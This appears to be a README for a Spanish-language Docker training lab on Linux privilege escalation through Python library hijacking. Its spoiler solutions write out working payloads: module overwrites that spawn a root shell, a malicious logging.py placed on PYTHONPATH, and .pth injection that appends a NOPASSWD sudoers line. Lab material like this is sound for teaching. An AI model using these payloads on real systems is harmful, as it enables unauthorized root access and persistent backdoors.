# 🐍 Python Library Hijacking - Privilege Escalation Lab

Laboratorio de práctica para escalada de privilegios mediante Python Library Hijacking en Linux.

## Requisitos
- Docker instalado

## Cómo usar

```bash
# Nivel 1 - Fácil
cd level1-easy
docker build -t pylab-easy .
docker run -it --rm pylab-easy

# Nivel 2 - Medio
cd level2-medium
docker build -t pylab-medium .
docker run -it --rm pylab-medium

# Nivel 3 - Difícil
cd level3-hard
docker build -t pylab-hard .
docker run -it --rm pylab-hard
```

### Dentro del contenedor
```bash
./instrucciones.sh
```

---

## Resumen de niveles

| Nivel | Técnica | Vector | Dificultad |
|-------|---------|--------|------------|
| 1 | Module overwrite | Directorio de scripts escribible + sudo | ⭐ |
| 2 | PYTHONPATH injection | Cronjob con PYTHONPATH apuntando a dir escribible | ⭐⭐ |
| 3 | .pth file injection | site-packages escribible + cronjob + rabbit holes | ⭐⭐⭐ |

---

## Conceptos clave

### ¿Cómo resuelve Python los imports?
Python busca módulos en este orden (sys.path):
1. Directorio del script que se ejecuta
2. Directorios en PYTHONPATH (variable de entorno)
3. Directorios de instalación (site-packages, etc.)

### ¿Qué es un archivo .pth?
Archivos en site-packages que Python procesa al arrancar.
Si una línea empieza con `import `, Python la **ejecuta automáticamente**.

### Comandos útiles de enumeración
```bash
sudo -l                                          # Qué puedo ejecutar como root?
cat /etc/cron.d/*                                # Cronjobs del sistema
python3 -c "import sys; print(sys.path)"         # Dónde busca Python módulos?
python3 -c "import site; print(site.getsitepackages())"  # site-packages
find / -writable -type d 2>/dev/null             # Directorios escribibles
find / -name "*.py" -writable 2>/dev/null        # Scripts Python escribibles
ls -la /etc/cron*                                # Revisar crons
env | grep -i python                             # Variables de entorno Python
```

---

## ⚠️ SOLUCIONES (SPOILERS) ⚠️

<details>
<summary>Nivel 1 - Solución</summary>

El script `/opt/scripts/healthcheck.py` importa `utils` y se ejecuta con sudo.
El directorio `/opt/scripts/` es escribible (chmod 777). Simplemente sobreescribir utils.py:

```bash
sudo -l
# Vemos: (root) NOPASSWD: /usr/bin/python3 /opt/scripts/healthcheck.py

ls -la /opt/scripts/
# Directorio es 777

# Sobreescribir utils.py con payload
cat > /opt/scripts/utils.py << 'EOF'
import os
def check_disk():
    os.system("/bin/bash")
    return "OK"
EOF

sudo /usr/bin/python3 /opt/scripts/healthcheck.py
# Shell como root!
cat /root/flag.txt
```

</details>

<details>
<summary>Nivel 2 - Solución</summary>

Un cronjob en `/etc/cron.d/monitoring` ejecuta un script con `PYTHONPATH=/opt/pylibs`.
El script importa `os` y `logging` (stdlib). Al poner PYTHONPATH antes, podemos
crear un `os.py` o `logging.py` malicioso en `/opt/pylibs/`:

```bash
cat /etc/cron.d/monitoring
# PYTHONPATH=/opt/pylibs /usr/bin/python3 /opt/monitoring/monitor.py

ls -la /opt/pylibs/
# Escribible!

cat /opt/monitoring/monitor.py
# importa os y logging

# Crear modulo malicioso (hijack logging que se importa primero)
cat > /opt/pylibs/logging.py << 'EOF'
import os
os.system("cp /root/flag.txt /tmp/flag.txt && chmod 644 /tmp/flag.txt")
# Importar el logging real para que el script no falle visiblemente
import importlib
import sys
del sys.modules['logging']
sys.path.remove('/opt/pylibs')
EOF

# Esperar ~1 minuto a que el cron ejecute
sleep 65
cat /tmp/flag.txt

# ALTERNATIVA: reverse shell o agregar hacker a sudoers
cat > /opt/pylibs/logging.py << 'EOF'
import os
os.system("echo 'hacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers")
EOF
# Esperar al cron, luego:
sudo bash
cat /root/flag.txt
```

</details>

<details>
<summary>Nivel 3 - Solución</summary>

**Paso 1: Enumerar**
```bash
sudo -l          # sysinfo.py - es rabbit hole (sanitiza todo)
cat /etc/cron.d/* # backup.py corre como root cada minuto
cat /opt/backup/backup.py  # importa json, datetime, shutil, os (stdlib)
ls -la /opt/backup/        # NO escribible
```

**Paso 2: El script no es escribible y no hay PYTHONPATH... ¿entonces qué?**
```bash
find / -writable -type d 2>/dev/null
# Se ve que site-packages es escribible!
# Verificar:
python3 -c "import site; print(site.getsitepackages())"
ls -la /usr/lib/python3/dist-packages/  # o la ruta que salga
```

**Paso 3: .pth injection**
Los archivos .pth se procesan al arrancar Python. Si una línea empieza con
`import `, se ejecuta como código:

```bash
SITE=$(python3 -c "import site; print(site.getsitepackages()[0])")

# Crear .pth malicioso
echo 'import os; os.system("cp /root/flag.txt /tmp/flag.txt; chmod 644 /tmp/flag.txt")' > "$SITE/pwned.pth"

# Esperar al cron (~1 minuto)
sleep 65
cat /tmp/flag.txt

# O para shell persistente:
echo 'import os; os.system("echo \"hacker ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers")' > "$SITE/pwned.pth"
sleep 65
sudo bash
cat /root/flag.txt
```

**Nota sobre los rabbit holes:**
- `sysinfo.py` via sudo: usa rutas absolutas y valida input, no es explotable.
- `/opt/.hidden/config.pyc`: contiene "secrets" falsos, no lleva a nada.
- La pista está en `/var/log/admin_notes.log`: "fix permissions on python dirs".

</details>

---

## Recursos
- [HackTricks - Python Library Hijacking](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python-library-hijacking)
- [PayloadsAllTheThings - Python Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [Artículo sobre .pth injection](https://www.elttam.com/blog/env/)